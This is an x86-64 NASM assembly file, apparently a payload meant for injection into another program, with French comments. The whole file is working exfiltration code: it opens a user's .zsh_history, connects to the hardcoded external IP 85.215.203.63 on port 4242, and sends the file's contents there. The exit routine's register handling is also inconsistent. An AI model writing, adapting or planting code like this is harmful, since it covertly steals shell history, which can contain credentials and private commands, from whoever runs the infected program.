[BITS 64]

%macro pushx 1-*
%rep %0
	push %1
	%rotate 1
%endrep
%endmacro

%macro popx 1-*
%rep %0
	%rotate -1
	pop %1
%endrep
%endmacro

section .text
global _payload
global _payload_size

_payload:
	pushfq
	pushx rsp, rax, rdi, rsi, rdx, r10, r12, r13, r14

	; Ouvrir le fichier
	mov rax, 2				; SYS_open
	lea rdi, [rel path]		; Chemin du fichier
	mov rsi, 0				; O_RDONLY
	syscall
	test rax, rax
	js exit					; Gestion de l'erreur

	mov r12, rax ; Descripteur de fichier

	; Obtenir la taille du fichier via lseek
	mov     rax, 8				; SYS_lseek
	mov     rdi, r12			; fichier ouvert
	xor     rsi, rsi			; offset = 0
	mov     rdx, 2				; SEEK_END
	syscall
	test    rax, rax
	js      error_open			; si erreur

	mov     r14, rax			; taille du fichier

	; Revenir au début du fichier
	mov     rax, 8				; SYS_lseek
	mov     rdi, r12
	xor     rsi, rsi
	xor     rdx, rdx			; SEEK_SET = 0
	syscall

	; Créer la socket
	mov rax, 41				; SYS_socket
	mov rdi, 2				; AF_INET
	mov rsi, 1				; SOCK_STREAM
	mov rdx, 0
	syscall
	test rax, rax
	js error_open			; Gestion de l'erreur

	; Sauvegarder le descripteur de socket
	mov r13, rax ; Descripteur de socket

	; Connecter au serveur
	mov rax, 42					; SYS_connect
	mov rdi, r13				; Descripteur de socket
	lea rsi, [rel sockaddr_in]	; Pointeur vers sockaddr_in
	mov rdx, 16					; Taille de sockaddr_in
	syscall
	test rax, rax
	js error_socket				; Gestion de l'erreur

	; Send the file
	mov rax, 40						; SYS_sendfile
	mov rdi, r13					; socket file descriptor
	mov rsi, r12					; file descriptor
	xor rdx, rdx					; offset (NULL)
	mov r10, r14					; size
	syscall
	test rax, rax
	js error_socket					; Gestion de l'erreur

error_socket:
	; Gestion de l'erreur
	; Fermer la socket
	mov rax, 3 ; SYS_close
	mov rdi, r13
	syscall

error_open:
	; Gestion de l'erreur
	; Fermer le fichier
	mov rax, 3 ; SYS_close
	mov rdi, r12
	syscall

exit:
	; Jump to the next instruction
	pushx rsp, rax, rdi, rsi, rdx, r10, r12, r13, r14
	popfq
	; jmp 0x0
	mov rax, 60
	mov rdi, 0
	syscall 

sockaddr_in:
	; - sin_family: 2 octets
	; - sin_port: 2 octets
	; - sin_addr: 4 octets
	; - sin_zero: 8 octets
	dw 2                    ; sin_family = AF_INET (2)
    dw 0x9210               ; sin_port = htons(4242) = 0x9210
    dd 0x3fcbd755           ; sin_addr = inet_addr("85.215.203.63")
    times 8 db 0            ; sin_zero (8 octets de padding)
	; Taille totale: 16 octets
; path		times 1024 db 0	; Chemin du fichier
path		db '/home/mbrement/.zsh_history', 0	; Chemin du fichier
_payload_size dq $- _payload